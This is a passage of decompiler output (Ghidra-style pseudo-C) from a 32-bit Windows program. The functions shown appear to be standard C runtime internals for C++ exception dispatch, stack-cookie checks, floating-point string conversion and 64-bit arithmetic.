  __CxxThrowException_8(0,(byte *)0x0);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

undefined4 FUN_00418c1e(void)

{
  int iVar1;
  int iVar2;
  undefined4 *puVar3;
  undefined (*pauVar4) [16];
  undefined4 uVar5;
  undefined4 extraout_ECX;
  int unaff_EBP;
  
  FUN_0040d634(&DAT_00420910,0x2c);
  iVar1 = *(int *)(unaff_EBP + 0xc);
  iVar2 = *(int *)(unaff_EBP + 8);
  *(undefined4 *)(unaff_EBP + -0x1c) = extraout_ECX;
  *(undefined4 *)(unaff_EBP + -0x34) = 0;
  *(undefined4 *)(unaff_EBP + -0x24) = *(undefined4 *)(iVar1 + -4);
  puVar3 = FUN_00417c4c((undefined4 *)(unaff_EBP + -0x3c),*(undefined4 *)(iVar2 + 0x18));
  *(undefined4 **)(unaff_EBP + -0x28) = puVar3;
  pauVar4 = FUN_0040cdba();
  *(undefined4 *)(unaff_EBP + -0x2c) = *(undefined4 *)(pauVar4[8] + 8);
  pauVar4 = FUN_0040cdba();
  *(undefined4 *)(unaff_EBP + -0x30) = *(undefined4 *)(pauVar4[8] + 0xc);
  pauVar4 = FUN_0040cdba();
  *(int *)(pauVar4[8] + 8) = iVar2;
  pauVar4 = FUN_0040cdba();
  *(undefined4 *)(pauVar4[8] + 0xc) = *(undefined4 *)(unaff_EBP + 0x10);
  *(undefined4 *)(unaff_EBP + -4) = 0;
  *(undefined4 *)(unaff_EBP + 0x10) = 1;
  *(undefined4 *)(unaff_EBP + -4) = 1;
  uVar5 = FUN_00417cf1(iVar1,*(undefined4 *)(unaff_EBP + 0x14),extraout_ECX,
                       *(int *)(unaff_EBP + 0x18),*(int *)(unaff_EBP + 0x1c));
  *(undefined4 *)(unaff_EBP + -0x1c) = uVar5;
  *(undefined4 *)(unaff_EBP + -4) = 0;
  *(undefined4 *)(unaff_EBP + -4) = 0xfffffffe;
  *(undefined4 *)(unaff_EBP + 0x10) = 0;
  FUN_00418d44();
  return *(undefined4 *)(unaff_EBP + -0x1c);
}



void FUN_00418d44(void)

{
  undefined (*pauVar1) [16];
  int iVar2;
  int unaff_EBP;
  int *unaff_ESI;
  int unaff_EDI;
  
  *(undefined4 *)(unaff_EDI + -4) = *(undefined4 *)(unaff_EBP + -0x24);
  FUN_00417c9f(*(int *)(unaff_EBP + -0x28));
  pauVar1 = FUN_0040cdba();
  *(undefined4 *)(pauVar1[8] + 8) = *(undefined4 *)(unaff_EBP + -0x2c);
  pauVar1 = FUN_0040cdba();
  *(undefined4 *)(pauVar1[8] + 0xc) = *(undefined4 *)(unaff_EBP + -0x30);
  if ((((*unaff_ESI == -0x1f928c9d) && (unaff_ESI[4] == 3)) &&
      ((iVar2 = unaff_ESI[5], iVar2 == 0x19930520 ||
       ((iVar2 == 0x19930521 || (iVar2 == 0x19930522)))))) &&
     ((*(int *)(unaff_EBP + -0x34) == 0 && (*(int *)(unaff_EBP + -0x1c) != 0)))) {
    iVar2 = FUN_00417c78(unaff_ESI[6]);
    if (iVar2 != 0) {
      FUN_00418adc();
    }
  }
  return;
}



// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

undefined4 FUN_00418dba(void)

{
  uint *puVar1;
  byte *pbVar2;
  bool bVar3;
  undefined3 extraout_var;
  undefined3 extraout_var_00;
  int iVar4;
  undefined3 extraout_var_01;
  undefined3 extraout_var_02;
  undefined3 extraout_var_03;
  undefined3 extraout_var_04;
  undefined4 *puVar5;
  undefined3 extraout_var_05;
  undefined3 extraout_var_06;
  undefined3 extraout_var_07;
  int unaff_EBP;
  int *piVar6;
  uint uVar7;
  
  FUN_0040d634(&DAT_00420938,0xc);
  *(undefined4 *)(unaff_EBP + -0x1c) = 0;
  puVar1 = *(uint **)(unaff_EBP + 0x10);
  if (((puVar1[1] == 0) || (*(char *)(puVar1[1] + 8) == '\0')) ||
     ((puVar1[2] == 0 && ((*puVar1 & 0x80000000) == 0)))) {
    return 0;
  }
  uVar7 = *puVar1;
  piVar6 = *(int **)(unaff_EBP + 0xc);
  if (-1 < (int)uVar7) {
    piVar6 = (int *)(puVar1[2] + 0xc + (int)piVar6);
  }
  *(undefined4 *)(unaff_EBP + -4) = 0;
  if ((uVar7 & 8) == 0) {
    pbVar2 = *(byte **)(unaff_EBP + 0x14);
    iVar4 = *(int *)(*(int *)(unaff_EBP + 8) + 0x18);
    if ((*pbVar2 & 1) == 0) {
      if (*(int *)(pbVar2 + 0x18) == 0) {
        bVar3 = FUN_00419ad1(iVar4);
        if ((CONCAT31(extraout_var_03,bVar3) != 0) &&
           (bVar3 = FUN_00419ad1((int)piVar6), CONCAT31(extraout_var_04,bVar3) != 0)) {
          uVar7 = *(uint *)(pbVar2 + 0x14);
          puVar5 = (undefined4 *)
                   FUN_00418b31(*(int *)(*(int *)(unaff_EBP + 8) + 0x18),(int *)(pbVar2 + 8));
          FUN_0040c2f0(piVar6,puVar5,uVar7);
          goto LAB_00418f19;
        }
      }
      else {
        bVar3 = FUN_00419ad1(iVar4);
        if (((CONCAT31(extraout_var_05,bVar3) != 0) &&
            (bVar3 = FUN_00419ad1((int)piVar6), CONCAT31(extraout_var_06,bVar3) != 0)) &&
           (bVar3 = FUN_00419ad1(*(int *)(pbVar2 + 0x18)), CONCAT31(extraout_var_07,bVar3) != 0)) {
          *(uint *)(unaff_EBP + -0x1c) = ((*pbVar2 & 4) != 0) + 1;
          goto LAB_00418f19;
        }
      }
    }
    else {
      bVar3 = FUN_00419ad1(iVar4);
      if ((CONCAT31(extraout_var_01,bVar3) != 0) &&
         (bVar3 = FUN_00419ad1((int)piVar6), CONCAT31(extraout_var_02,bVar3) != 0)) {
        FUN_0040c2f0(piVar6,*(undefined4 **)(*(int *)(unaff_EBP + 8) + 0x18),
                     *(uint *)(pbVar2 + 0x14));
        if ((*(int *)(pbVar2 + 0x14) != 4) || (iVar4 = *piVar6, iVar4 == 0)) goto LAB_00418f19;
        goto LAB_00418e3f;
      }
    }
  }
  else {
    iVar4 = *(int *)(unaff_EBP + 8);
    bVar3 = FUN_00419ad1(*(int *)(iVar4 + 0x18));
    if ((CONCAT31(extraout_var,bVar3) != 0) &&
       (bVar3 = FUN_00419ad1((int)piVar6), CONCAT31(extraout_var_00,bVar3) != 0)) {
      iVar4 = *(int *)(iVar4 + 0x18);
      *piVar6 = iVar4;
      pbVar2 = *(byte **)(unaff_EBP + 0x14);
LAB_00418e3f:
      iVar4 = FUN_00418b31(iVar4,(int *)(pbVar2 + 8));
      *piVar6 = iVar4;
      goto LAB_00418f19;
    }
  }
  FUN_00414e94();
LAB_00418f19:
  *(undefined4 *)(unaff_EBP + -4) = 0xfffffffe;
  return *(undefined4 *)(unaff_EBP + -0x1c);
}



// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

void FUN_00418f39(void)

{
  int iVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  int unaff_EBP;
  
  FUN_0040d634(&DAT_00420958,8);
  if ((**(uint **)(unaff_EBP + 0x10) & 0x80000000) == 0) {
    iVar4 = (*(uint **)(unaff_EBP + 0x10))[2] + 0xc + *(int *)(unaff_EBP + 0xc);
  }
  else {
    iVar4 = *(int *)(unaff_EBP + 0xc);
  }
  *(undefined4 *)(unaff_EBP + -4) = 0;
  iVar1 = *(int *)(unaff_EBP + 0x14);
  iVar2 = *(int *)(unaff_EBP + 8);
  iVar3 = FUN_00418dba();
  if (iVar3 == 1) {
    FUN_00418b31(*(int *)(iVar2 + 0x18),(int *)(iVar1 + 8));
    FUN_0041799d(iVar4,*(undefined **)(iVar1 + 0x18));
  }
  else if (iVar3 == 2) {
    FUN_00418b31(*(int *)(iVar2 + 0x18),(int *)(iVar1 + 8));
    FUN_0041799d(iVar4,*(undefined **)(iVar1 + 0x18));
  }
  *(undefined4 *)(unaff_EBP + -4) = 0xfffffffe;
  return;
}



void __cdecl FUN_00418fcb(PEXCEPTION_RECORD param_1)

{
  undefined *UNRECOVERED_JUMPTABLE;
  PVOID unaff_ESI;
  int unaff_EDI;
  int in_stack_00000014;
  PVOID in_stack_0000001c;
  
  if (in_stack_00000014 != 0) {
    FUN_00418f39();
  }
  if (in_stack_0000001c == (PVOID)0x0) {
    in_stack_0000001c = unaff_ESI;
  }
  FUN_004179a4(in_stack_0000001c,param_1);
  FUN_004189b6();
  *(int *)((int)unaff_ESI + 8) = *(int *)(unaff_EDI + 4) + 1;
  UNRECOVERED_JUMPTABLE = (undefined *)FUN_00418c1e();
  if (UNRECOVERED_JUMPTABLE != (undefined *)0x0) {
    FUN_0041796b(UNRECOVERED_JUMPTABLE);
  }
  return;
}



void __cdecl
FUN_00419039(PEXCEPTION_RECORD param_1,undefined4 *param_2,undefined4 param_3,undefined4 param_4,
            int param_5,int param_6,int param_7,undefined4 param_8)

{
  undefined (*pauVar1) [16];
  int iVar2;
  int *piVar3;
  int iVar4;
  uint local_c;
  uint local_8;
  
  if (param_1->ExceptionCode != 0x80000003) {
    pauVar1 = FUN_0040cdba();
    if (*(int *)pauVar1[8] != 0) {
      pauVar1 = FUN_0040cdba();
      iVar2 = FUN_0040cb65();
      if (((*(int *)pauVar1[8] != iVar2) && (param_1->ExceptionCode != 0xe0434f4d)) &&
         (iVar2 = FUN_00417a61(&param_1->ExceptionCode,param_2,param_3,param_4,param_5,param_7,
                               param_8), iVar2 != 0)) {
        return;
      }
    }
    if (*(int *)(param_5 + 0xc) == 0) {
      FUN_00414e94();
    }
    piVar3 = (int *)FUN_00417bd7(param_5,param_7,param_6,&local_8,&local_c);
    if (local_8 < local_c) {
      do {
        if ((*piVar3 <= param_6) && (param_6 <= piVar3[1])) {
          iVar4 = piVar3[3] * 0x10 + piVar3[4];
          iVar2 = *(int *)(iVar4 + -0xc);
          if (((iVar2 == 0) || (*(char *)(iVar2 + 8) == '\0')) &&
             ((*(byte *)(iVar4 + -0x10) & 0x40) == 0)) {
            FUN_00418fcb(param_1);
          }
        }
        local_8 = local_8 + 1;
        piVar3 = piVar3 + 5;
      } while (local_8 < local_c);
    }
  }
  return;
}



void __cdecl
FUN_0041912d(PEXCEPTION_RECORD param_1,undefined4 *param_2,undefined4 param_3,undefined4 param_4,
            PEXCEPTION_RECORD param_5,char param_6,int param_7,undefined4 *param_8)

{
  ULONG_PTR UVar1;
  PEXCEPTION_RECORD pEVar2;
  bool bVar3;
  char cVar4;
  undefined (*pauVar5) [16];
  undefined3 extraout_var;
  int *piVar6;
  undefined extraout_DL;
  PEXCEPTION_RECORD pEVar7;
  byte **ppbVar8;
  int iVar9;
  PEXCEPTION_RECORD pEVar10;
  undefined4 *puVar11;
  undefined4 local_30 [3];
  byte *local_24;
  uint local_20;
  int local_1c;
  byte *local_18;
  uint local_14;
  byte *local_10;
  int local_c;
  char local_5;
  
  local_5 = '\0';
  if ((int)param_5->ExceptionFlags < 0x81) {
    local_c = (int)*(char *)(param_2 + 2);
  }
  else {
    local_c = param_2[2];
  }
  if ((local_c < -1) || ((int)param_5->ExceptionFlags <= local_c)) {
    FUN_00414e94();
  }
  pEVar10 = param_1;
  if (param_1->ExceptionCode != 0xe06d7363) goto LAB_00419430;
  pEVar7 = (PEXCEPTION_RECORD)0x19930520;
  if (param_1->NumberParameters != 3) goto LAB_0041929d;
  UVar1 = param_1->ExceptionInformation[0];
  if (((UVar1 != 0x19930520) && (UVar1 != 0x19930521)) && (UVar1 != 0x19930522)) goto LAB_0041929d;
  if (param_1->ExceptionInformation[2] != 0) goto LAB_0041929d;
  pauVar5 = FUN_0040cdba();
  if (*(int *)(pauVar5[8] + 8) != 0) {
    pauVar5 = FUN_0040cdba();
    param_1 = *(PEXCEPTION_RECORD *)(pauVar5[8] + 8);
    pauVar5 = FUN_0040cdba();
    param_3 = *(undefined4 *)(pauVar5[8] + 0xc);
    bVar3 = FUN_00419ad1((int)param_1);
    if (CONCAT31(extraout_var,bVar3) == 0) {
      FUN_00414e94();
    }
    if ((((param_1->ExceptionCode == 0xe06d7363) && (param_1->NumberParameters == 3)) &&
        ((UVar1 = param_1->ExceptionInformation[0], UVar1 == 0x19930520 ||
         ((UVar1 == 0x19930521 || (UVar1 == 0x19930522)))))) &&
       (param_1->ExceptionInformation[2] == 0)) {
      FUN_00414e94();
    }
    pauVar5 = FUN_0040cdba();
    if (*(int *)(pauVar5[9] + 4) == 0) goto LAB_0041929d;
    pauVar5 = FUN_0040cdba();
    piVar6 = *(int **)(pauVar5[9] + 4);
    pauVar5 = FUN_0040cdba();
    iVar9 = 0;
    *(undefined4 *)(pauVar5[9] + 4) = 0;
    cVar4 = FUN_00418b5a((int)param_1);
    if (cVar4 != '\0') goto LAB_0041929d;
    pEVar7 = (PEXCEPTION_RECORD)0x0;
    if (0 < *piVar6) {
      do {
        bVar3 = FUN_0041153f(*(void **)((int)pEVar7->ExceptionInformation + piVar6[1] + -0x10),
                             0x423684);
        if (bVar3) goto LAB_0041926e;
        iVar9 = iVar9 + 1;
        pEVar7 = (PEXCEPTION_RECORD)&pEVar7->NumberParameters;
      } while (iVar9 < *piVar6);
    }
    do {
      FUN_00414e48();
LAB_0041926e:
      FUN_00418adc();
      FUN_004188be(local_30,extraout_DL,0x98);
      __CxxThrowException_8(local_30,&DAT_00420974);
LAB_0041929d:
      pEVar10 = param_1;
      if (((param_1->ExceptionCode == 0xe06d7363) && (param_1->NumberParameters == 3)) &&
         ((pEVar2 = (PEXCEPTION_RECORD)param_1->ExceptionInformation[0], pEVar2 == pEVar7 ||
          ((pEVar2 == (PEXCEPTION_RECORD)0x19930521 || (pEVar2 == (PEXCEPTION_RECORD)0x19930522)))))
         ) {
        if (param_5->ExceptionAddress != (PVOID)0x0) {
          piVar6 = (int *)FUN_00417bd7((int)param_5,param_7,local_c,&local_14,&local_20);
          for (; local_14 < local_20; local_14 = local_14 + 1) {
            if ((*piVar6 <= local_c) && (local_c <= piVar6[1])) {
              local_10 = (byte *)piVar6[4];
              for (local_1c = piVar6[3]; 0 < local_1c; local_1c = local_1c + -1) {
                ppbVar8 = *(byte ***)(param_1->ExceptionInformation[2] + 0xc);
                for (local_18 = *ppbVar8; 0 < (int)local_18; local_18 = local_18 + -1) {
                  ppbVar8 = ppbVar8 + 1;
                  local_24 = *ppbVar8;
                  iVar9 = FUN_0041890e(local_10,local_24,(uint *)param_1->ExceptionInformation[2]);
                  if (iVar9 != 0) {
                    local_5 = '\x01';
                    FUN_00418fcb(param_1);
                    goto LAB_00419386;
                  }
                }
                local_10 = local_10 + 0x10;
              }
            }
LAB_00419386:
            piVar6 = piVar6 + 5;
          }
        }
        if (param_6 != '\0') {
          FUN_00418adc();
        }
        if ((((local_5 != '\0') || ((param_5->ExceptionCode & 0x1fffffff) < 0x19930521)) ||
            (param_5->ExceptionInformation[2] == 0)) ||
           (cVar4 = FUN_00418b5a((int)param_1), cVar4 != '\0')) goto LAB_0041945c;
        FUN_0040cdba();
        FUN_0040cdba();
        pauVar5 = FUN_0040cdba();
        *(PEXCEPTION_RECORD *)(pauVar5[8] + 8) = param_1;
        pauVar5 = FUN_0040cdba();
        *(undefined4 *)(pauVar5[8] + 0xc) = param_3;
        puVar11 = param_8;
        if (param_8 == (undefined4 *)0x0) {
          puVar11 = param_2;
        }
        FUN_004179a4(puVar11,param_1);
        FUN_004189b6();
        FUN_00418bd5();
        pEVar10 = param_5;
      }
LAB_00419430:
      if (param_5->ExceptionAddress == (PVOID)0x0) goto LAB_0041945c;
      pEVar7 = param_5;
    } while (param_6 != '\0');
    FUN_00419039(pEVar10,param_2,param_3,param_4,(int)param_5,local_c,param_7,param_8);
LAB_0041945c:
    pauVar5 = FUN_0040cdba();
    if (*(int *)(pauVar5[9] + 4) != 0) {
      FUN_00414e94();
    }
  }
  return;
}



undefined4 * __thiscall FUN_00419474(void *this,int param_1)

{
  FUN_0041146d(this,param_1);
  *(undefined **)this = &DAT_00420090;
  return (undefined4 *)this;
}



undefined4 __cdecl
FUN_00419491(PEXCEPTION_RECORD param_1,undefined4 *param_2,undefined4 param_3,undefined4 param_4,
            PEXCEPTION_RECORD param_5,int param_6,undefined4 *param_7,char param_8)

{
  code *pcVar1;
  undefined (*pauVar2) [16];
  undefined4 uVar3;
  
  pauVar2 = FUN_0040cdba();
  if ((((*(int *)(pauVar2[0x20] + 0xc) != 0) || (param_1->ExceptionCode == 0xe06d7363)) ||
      (param_1->ExceptionCode == 0x80000026)) ||
     (((param_5->ExceptionCode & 0x1fffffff) < 0x19930522 ||
      ((*(byte *)(param_5->ExceptionInformation + 3) & 1) == 0)))) {
    if ((*(byte *)&param_1->ExceptionFlags & 0x66) == 0) {
      if ((param_5->ExceptionAddress != (PVOID)0x0) ||
         ((0x19930520 < (param_5->ExceptionCode & 0x1fffffff) &&
          (param_5->ExceptionInformation[2] != 0)))) {
        if ((param_1->ExceptionCode == 0xe06d7363) &&
           (((2 < param_1->NumberParameters && (0x19930522 < param_1->ExceptionInformation[0])) &&
            (pcVar1 = *(code **)(param_1->ExceptionInformation[2] + 8), pcVar1 != (code *)0x0)))) {
          uVar3 = (*pcVar1)(param_1,param_2,param_3,param_4,param_5,param_6,param_7,param_8);
          return uVar3;
        }
        FUN_0041912d(param_1,param_2,param_3,param_4,param_5,param_8,param_6,param_7);
      }
    }
    else if ((param_5->ExceptionFlags != 0) && (param_6 == 0)) {
      FUN_004189b6();
    }
  }
  return 1;
}



// WARNING: Restarted to delay deadcode elimination for space: stack

void FUN_00419580(undefined4 param_1,undefined4 param_2,int param_3)

{
  code *pcVar1;
  
  pcVar1 = (code *)FUN_0041493c(param_3);
  (*pcVar1)();
  if (param_3 == 0x100) {
    param_3 = 2;
  }
  FUN_0041493c(param_3);
  return;
}



void __cdecl FUN_004195cc(uint *param_1,char *param_2,undefined (**param_3) [16])

{
  int iVar1;
  undefined4 extraout_EDX;
  char *local_2c;
  undefined local_28 [8];
  int local_20;
  char local_1c;
  uint local_18;
  ushort local_14 [6];
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  FUN_0040b970(local_28,param_3);
  local_18 = FUN_0041a56b(local_14,&local_2c,param_2,0,0,0,0,(int)local_28);
  iVar1 = FUN_00419ae3(local_14,param_1);
  if ((local_18 & 3) == 0) {
    if (iVar1 == 1) {
LAB_00419625:
      if (local_1c != '\0') {
        *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
      }
      goto LAB_00419665;
    }
    if (iVar1 != 2) {
LAB_00419657:
      if (local_1c != '\0') {
        *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
      }
      goto LAB_00419665;
    }
  }
  else if ((local_18 & 1) == 0) {
    if ((local_18 & 2) == 0) goto LAB_00419657;
    goto LAB_00419625;
  }
  if (local_1c != '\0') {
    *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
  }
LAB_00419665:
  FUN_0040a982(local_8 ^ (uint)&stack0xfffffffc,extraout_EDX);
  return;
}



void __cdecl FUN_00419674(uint *param_1,char *param_2,undefined (**param_3) [16])

{
  int iVar1;
  undefined4 extraout_EDX;
  char *local_2c;
  undefined local_28 [8];
  int local_20;
  char local_1c;
  uint local_18;
  ushort local_14 [6];
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  FUN_0040b970(local_28,param_3);
  local_18 = FUN_0041a56b(local_14,&local_2c,param_2,0,0,0,0,(int)local_28);
  iVar1 = FUN_0041a027(local_14,param_1);
  if ((local_18 & 3) == 0) {
    if (iVar1 == 1) {
LAB_004196cd:
      if (local_1c != '\0') {
        *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
      }
      goto LAB_0041970d;
    }
    if (iVar1 != 2) {
LAB_004196ff:
      if (local_1c != '\0') {
        *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
      }
      goto LAB_0041970d;
    }
  }
  else if ((local_18 & 1) == 0) {
    if ((local_18 & 2) == 0) goto LAB_004196ff;
    goto LAB_004196cd;
  }
  if (local_1c != '\0') {
    *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
  }
LAB_0041970d:
  FUN_0040a982(local_8 ^ (uint)&stack0xfffffffc,extraout_EDX);
  return;
}



undefined4 __cdecl FUN_0041971c(undefined4 *param_1,uint param_2,int param_3,int param_4)

{
  undefined4 *puVar1;
  int iVar2;
  char *pcVar3;
  char cVar4;
  char *pcVar5;
  undefined4 uVar6;
  
  pcVar5 = *(char **)(param_4 + 0xc);
  if ((param_1 == (undefined4 *)0x0) || (param_2 == 0)) {
    puVar1 = (undefined4 *)FUN_0040caaa();
    uVar6 = 0x16;
    *puVar1 = 0x16;
  }
  else {
    *(undefined *)param_1 = 0;
    iVar2 = param_3;
    if (param_3 < 1) {
      iVar2 = 0;
    }
    if (iVar2 + 1U < param_2) {
      *(undefined *)param_1 = 0x30;
      pcVar3 = (char *)((int)param_1 + 1);
      if (0 < param_3) {
        do {
          cVar4 = *pcVar5;
          if (cVar4 == '\0') {
            cVar4 = '0';
          }
          else {
            pcVar5 = pcVar5 + 1;
          }
          *pcVar3 = cVar4;
          pcVar3 = pcVar3 + 1;
          param_3 = param_3 + -1;
        } while (0 < param_3);
      }
      *pcVar3 = '\0';
      if ((-1 < param_3) && ('4' < *pcVar5)) {
        while (pcVar3 = pcVar3 + -1, *pcVar3 == '9') {
          *pcVar3 = '0';
        }
        *pcVar3 = *pcVar3 + '\x01';
      }
      if (*(char *)param_1 == '1') {
        *(int *)(param_4 + 4) = *(int *)(param_4 + 4) + 1;
      }
      else {
        pcVar5 = FUN_00415330((uint *)((int)param_1 + 1));
        FUN_0040c2f0(param_1,(uint *)((int)param_1 + 1),(uint)(pcVar5 + 1));
      }
      return 0;
    }
    puVar1 = (undefined4 *)FUN_0040caaa();
    uVar6 = 0x22;
    *puVar1 = 0x22;
  }
  FUN_0040ca42();
  return uVar6;
}



void __cdecl FUN_004197db(uint *param_1,uint *param_2)

{
  uint uVar1;
  ushort uVar2;
  ushort uVar3;
  ushort uVar4;
  uint local_8;
  
  uVar2 = *(ushort *)((int)param_2 + 6) >> 4;
  uVar4 = *(ushort *)((int)param_2 + 6) & 0x8000;
  uVar3 = uVar2 & 0x7ff;
  uVar1 = *param_2;
  local_8 = 0x80000000;
  if ((uVar2 & 0x7ff) == 0) {
    if (((param_2[1] & 0xfffff) == 0) && (uVar1 == 0)) {
      param_1[1] = 0;
      *param_1 = 0;
      goto LAB_0041988f;
    }
    uVar3 = uVar3 + 0x3c01;
    local_8 = 0;
  }
  else if (uVar3 == 0x7ff) {
    uVar3 = 0x7fff;
  }
  else {
    uVar3 = uVar3 + 0x3c00;
  }
  param_1[1] = uVar1 >> 0x15 | (param_2[1] & 0xfffff) << 0xb | local_8;
  *param_1 = uVar1 << 0xb;
  while (local_8 == 0) {
    uVar1 = param_1[1];
    uVar3 = uVar3 - 1;
    param_1[1] = uVar1 * 2 | *param_1 >> 0x1f;
    *param_1 = *param_1 * 2;
    local_8 = uVar1 * 2 & 0x80000000;
  }
  uVar4 = uVar4 | uVar3;
LAB_0041988f:
  *(ushort *)(param_1 + 2) = uVar4;
  return;
}



void __cdecl
FUN_00419898(undefined4 param_1,undefined4 param_2,int *param_3,char *param_4,int param_5)

{
  int *piVar1;
  char *pcVar2;
  int iVar3;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 uVar4;
  short local_30;
  char local_2e;
  char local_2c [24];
  uint local_14;
  uint uStack_10;
  ushort uStack_c;
  uint local_8;
  
  pcVar2 = param_4;
  piVar1 = param_3;
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  FUN_004197db(&local_14,&param_1);
  iVar3 = FUN_0041ac63(local_14,uStack_10,uStack_c,0x11,0,&local_30);
  piVar1[2] = iVar3;
  *piVar1 = (int)local_2e;
  piVar1[1] = (int)local_30;
  iVar3 = FUN_0040bcd6(pcVar2,param_5,local_2c);
  uVar4 = extraout_EDX;
  if (iVar3 != 0) {
    FUN_0040c91a();
    uVar4 = extraout_EDX_00;
  }
  piVar1[3] = (int)pcVar2;
  FUN_0040a982(local_8 ^ (uint)&stack0xfffffffc,uVar4);
  return;
}



undefined8 FUN_00419930(uint param_1,uint param_2,uint param_3,uint param_4)

{
  ulonglong uVar1;
  longlong lVar2;
  uint uVar3;
  int iVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  bool bVar10;
  char cVar11;
  uint uVar9;
  
  cVar11 = (int)param_2 < 0;
  if ((bool)cVar11) {
    bVar10 = param_1 != 0;
    param_1 = -param_1;
    param_2 = -(uint)bVar10 - param_2;
  }
  if ((int)param_4 < 0) {
    cVar11 = cVar11 + '\x01';
    bVar10 = param_3 != 0;
    param_3 = -param_3;
    param_4 = -(uint)bVar10 - param_4;
  }
  uVar3 = param_1;
  uVar5 = param_3;
  uVar6 = param_2;
  uVar9 = param_4;
  if (param_4 == 0) {
    uVar3 = param_2 / param_3;
    iVar4 = (int)(((ulonglong)param_2 % (ulonglong)param_3 << 0x20 | (ulonglong)param_1) /
                 (ulonglong)param_3);
  }
  else {
    do {
      uVar8 = uVar9 >> 1;
      uVar5 = uVar5 >> 1 | (uint)((uVar9 & 1) != 0) << 0x1f;
      uVar7 = uVar6 >> 1;
      uVar3 = uVar3 >> 1 | (uint)((uVar6 & 1) != 0) << 0x1f;
      uVar6 = uVar7;
      uVar9 = uVar8;
    } while (uVar8 != 0);
    uVar1 = CONCAT44(uVar7,uVar3) / (ulonglong)uVar5;
    iVar4 = (int)uVar1;
    lVar2 = (ulonglong)param_3 * (uVar1 & 0xffffffff);
    uVar3 = (uint)((ulonglong)lVar2 >> 0x20);
    uVar5 = uVar3 + iVar4 * param_4;
    if (((CARRY4(uVar3,iVar4 * param_4)) || (param_2 < uVar5)) ||
       ((param_2 <= uVar5 && (param_1 < (uint)lVar2)))) {
      iVar4 = iVar4 + -1;
    }
    uVar3 = 0;
  }
  if (cVar11 == '\x01') {
    bVar10 = iVar4 != 0;
    iVar4 = -iVar4;
    uVar3 = -(uint)bVar10 - uVar3;
  }
  return CONCAT44(uVar3,iVar4);
}



ulonglong __fastcall FUN_00419a10(byte param_1,uint param_2)

{
  uint in_EAX;
  
  if (0x3f < param_1) {
    return 0;
  }
  if (param_1 < 0x20) {
    return CONCAT44(param_2 >> (param_1 & 0x1f),
                    in_EAX >> (param_1 & 0x1f) | param_2 << 0x20 - (param_1 & 0x1f));
  }
  return (ulonglong)(param_2 >> (param_1 & 0x1f));
}



undefined4 __cdecl FUN_00419a2f(uint *param_1,uint param_2,uint param_3)

{
  uint uVar1;
  undefined4 *puVar2;
  undefined4 uVar3;
  
  uVar1 = param_3 & 0xfff7ffff;
  if ((param_2 & uVar1 & 0xfcf0fce0) == 0) {
    if (param_1 == (uint *)0x0) {
      FUN_0041b6b5(param_2,uVar1);
    }
    else {
      uVar1 = FUN_0041b6b5(param_2,uVar1);
      *param_1 = uVar1;
    }
    uVar3 = 0;
  }
  else {
    if (param_1 != (uint *)0x0) {
      uVar1 = FUN_0041b6b5(0,0);
      *param_1 = uVar1;
    }
    puVar2 = (undefined4 *)FUN_0040caaa();
    uVar3 = 0x16;
    *puVar2 = 0x16;
    FUN_0040ca42();
  }
  return uVar3;
}



// WARNING: Unable to track spacebase fully for stack
// WARNING: Variable defined which should be unmapped: param_1

void __cdecl FUN_00419a9b(int param_1)

{
  int iVar1;
  undefined4 unaff_EBX;
  undefined4 unaff_ESI;
  undefined4 unaff_EDI;
  int *unaff_FS_OFFSET;
  undefined4 unaff_retaddr;
  uint auStack_1c [5];
  undefined local_8 [8];
  
  iVar1 = -param_1;
  *(undefined4 *)((int)auStack_1c + iVar1 + 0x10) = unaff_EBX;
  *(undefined4 *)((int)auStack_1c + iVar1 + 0xc) = unaff_ESI;
  *(undefined4 *)((int)auStack_1c + iVar1 + 8) = unaff_EDI;
  *(uint *)((int)auStack_1c + iVar1 + 4) = DAT_00422044 ^ (uint)&param_1;
  *(undefined4 *)((int)auStack_1c + iVar1) = unaff_retaddr;
  *unaff_FS_OFFSET = (int)local_8;
  return;
}



bool __cdecl FUN_00419ad1(int param_1)

{
  return param_1 != 0;
}



undefined4 __cdecl FUN_00419ae3(ushort *param_1,uint *param_2)

{
  ushort uVar1;
  ushort *puVar2;
  int iVar3;
  undefined4 uVar4;
  byte bVar5;
  ushort **ppuVar6;
  ushort **ppuVar7;
  uint uVar8;
  ushort *puVar9;
  ushort *puVar10;
  uint uVar11;
  int iVar12;
  uint uVar13;
  int iVar14;
  bool bVar15;
  ushort *local_24;
  uint local_20;
  ushort *local_1c;
  uint local_18;
  uint local_14;
  uint local_10;
  int local_c;
  ushort *local_8;
  
  local_18 = param_1[5] & 0x8000;
  puVar2 = *(ushort **)(param_1 + 3);
  local_24 = puVar2;
  uVar13 = *(uint *)(param_1 + 1);
  uVar1 = *param_1;
  uVar11 = param_1[5] & 0x7fff;
  iVar12 = uVar11 - 0x3fff;
  local_20 = uVar13;
  local_1c = (ushort *)((uint)uVar1 << 0x10);
  if (iVar12 == -0x3fff) {
    iVar12 = 0;
    iVar3 = 0;
    do {
      if ((&local_24)[iVar3] != (ushort *)0x0) {
        local_24 = (ushort *)0x0;
        local_20 = 0;
        uVar4 = 2;
        goto LAB_00419fe4;
      }
      iVar3 = iVar3 + 1;
    } while (iVar3 < 3);
    uVar4 = 0;
  }
  else {
    param_1 = (ushort *)0x0;
    iVar14 = DAT_004236b8 - 1;
    iVar3 = (int)(DAT_004236b8 + ((int)DAT_004236b8 >> 0x1f & 0x1fU)) >> 5;
